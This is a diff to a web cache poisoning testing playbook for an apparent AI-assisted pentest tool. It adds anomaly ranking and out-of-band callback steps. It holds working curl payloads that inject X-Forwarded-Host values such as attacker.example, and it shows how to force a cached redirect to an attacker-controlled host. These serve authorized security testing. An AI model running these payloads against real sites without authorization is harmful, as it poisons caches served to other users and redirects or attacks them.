@@ -17,6 +17,8 @@ origin: AI Threat Hunting
 ## Tools
 
 - `aith assess kali exec -- curl ...` (header injection probing and cache behavior analysis — all target-facing curl must go through the kali exec wrapper so the request lands in the audit pipeline; use `--technique OTHER --probe-kind payload --phase consume-test --timeout 30` for probing calls)
+- `aith assess anomaly-score` — for unkeyed-input discovery (§2/§3): record one response per candidate header/cookie and let it rank which injected input actually shifted the response, instead of diffing curl bodies by eye.
+- `aith oob mint` / `aith oob poll` — for redirect-based poisoning (§9) where the poisoned `Location` points at attacker infra: mint a nonce-tagged host, force it into the cached redirect, then `poll` to confirm a victim followed it. Replaces reading the raw listener log. Readiness: `aith oob status --json`.
 - `Param Miner` (Burp extension for unkeyed header/parameter discovery)
 - Browser (verify poisoned responses served to other users)
 
@@ -32,17 +34,23 @@ curl -sI https://target/ | grep -iE "x-cache|age|cf-cache|via|vary|cdn|akamai|va
 - [ ] Add cache buster to isolate tests: `?cachebuster=random123`
 
 ### 2. Unkeyed Header Discovery
-- [ ] Test common unkeyed headers that influence response content
+- [ ] Test common unkeyed headers that influence response content. Capture one response record per header (always with a fresh cache buster so each is an origin hit) and rank which header moved the response — the header that shifts status/length/content-type away from the no-header baseline is the unkeyed input worth poisoning:
 ```bash
-curl -H "X-Forwarded-Host: attacker.example" https://target/?cb=test1
-curl -H "X-Forwarded-Scheme: http" https://target/?cb=test2
-curl -H "X-Original-URL: /admin" https://target/?cb=test3
-curl -H "X-Rewrite-URL: /admin" https://target/?cb=test4
-curl -H "X-Forwarded-Port: 443" https://target/?cb=test5
-curl -H "X-Host: attacker.example" https://target/?cb=test6
+{
+  # baseline (no injected header) anchors the population
+  read -r code len <<<"$(curl -s -o /dev/null -w '%{http_code} %{size_download}' "https://target/?cb=base")"
+  printf '{"url":"baseline","status":%s,"content_length":%s}\n' "$code" "$len"
+  for h in "X-Forwarded-Host: attacker.example" "X-Forwarded-Scheme: http" \
+           "X-Original-URL: /admin" "X-Rewrite-URL: /admin" \
+           "X-Forwarded-Port: 443" "X-Host: attacker.example"; do
+    cb=$(openssl rand -hex 4)
+    read -r code len <<<"$(curl -s -o /dev/null -w '%{http_code} %{size_download}' -H "$h" "https://target/?cb=$cb")"
+    printf '{"url":"%s","status":%s,"content_length":%s}\n' "${h%%:*}" "$code" "$len"
+  done
+} | aith assess anomaly-score --top 8
 ```
-- [ ] Check if injected header value appears in response (links, redirects, meta tags, scripts)
-- [ ] If reflected, remove cache buster and re-send to poison the real cache entry
+- [ ] The top-ranked record names the header whose response broke from the baseline cluster — confirm the injected value is reflected (links, redirects, meta tags, scripts) in that response's body.
+- [ ] If reflected, remove the cache buster and re-send to poison the real cache entry.
 
 ### 3. Unkeyed Cookie Testing
 - [ ] Identify cookies that change response content but are excluded from cache key
@@ -98,19 +106,23 @@ curl -H "Accept-Encoding: gzip" -H "X-Forwarded-Host: evil.example" https://targ
 - [ ] **Fastly**: test `Fastly-Debug: 1` header for cache key disclosure
 
 ### 9. Redirect-Based Poisoning
-- [ ] Poison redirect target via `X-Forwarded-Scheme: http` forcing 301 to attacker-controlled location
+- [ ] Poison redirect target via `X-Forwarded-Scheme: http` / `X-Forwarded-Host` forcing a 301/302 to an attacker-controlled location. Point the poisoned redirect at a minted callback host so a victim following the cached redirect is provably attributable — `poll` turns "the redirect points at attacker.example" into "a real client followed the poisoned redirect":
 ```bash
-curl -H "X-Forwarded-Scheme: http" https://target/
-curl -H "X-Forwarded-Host: attacker.example" -H "X-Forwarded-Scheme: https" https://target/
+aith oob mint --technique cache-poison --target-url "https://target/" \
+  --param X-Forwarded-Host --probe-kind redirect-poison
+# Poison: force the cached Location to the minted host
+curl -H "X-Forwarded-Host: <nonce>.researcher.example" -H "X-Forwarded-Scheme: https" https://target/
+# Confirm: a victim (or your own clean fetch of the cached entry) followed it
+aith oob poll --client <name>     # matched row = the poisoned redirect was followed
 ```
-- [ ] If 301/302 response is cached, all users follow the poisoned redirect
+- [ ] If the 301/302 is cached, every user who hits the entry follows the poisoned redirect — a matched callback from a request that did NOT carry your header proves cross-user impact, not just that you can set your own Location.
 
 ## What to Record
 
 - Cache layer identified (CDN, reverse proxy, product name and version if known)
-- Unkeyed input that influences response (header, cookie, body)
+- Unkeyed input that influences response (header, cookie, body) — the `anomaly-score` ranking that isolated it from the baseline is good corroborating evidence
 - Exact request that poisons the cache
-- Evidence that poisoned response is served to other users (second request without the unkeyed input) — confirming the primitive exists is not enough; you must show the **attacker outcome**: what a victim receives when they hit the poisoned cache entry (e.g., malicious script executes in victim's browser, victim is redirected to attacker-controlled domain, victim's sensitive data is served to an unauthenticated requester)
+- Evidence that poisoned response is served to other users (second request without the unkeyed input) — confirming the primitive exists is not enough; you must show the **attacker outcome**: what a victim receives when they hit the poisoned cache entry (e.g., malicious script executes in victim's browser, victim is redirected to attacker-controlled domain, victim's sensitive data is served to an unauthenticated requester). For a redirect poison, the matched probe<->callback from `aith oob poll --client <name> --json` on a header-free request IS that cross-user proof.
 - Impact: XSS via poisoned response, redirect to attacker domain, sensitive data exposure via cache deception
 - Full request/response pairs for both poisoning and victim requests
 
